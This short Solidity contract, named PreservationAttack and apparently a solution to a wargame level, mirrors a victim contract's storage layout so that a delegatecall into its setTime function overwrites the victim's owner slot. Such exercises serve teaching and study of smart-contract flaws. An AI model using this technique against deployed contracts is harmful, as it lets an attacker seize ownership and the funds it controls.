pragma solidity ^0.6.0;

contract PreservationAttack {

  address slot0;
  address slot1; 
  address ownerSlot;

  function setTime(uint addressAsUint) public {
    // Sets the owner
    ownerSlot = address(addressAsUint);
  }
}
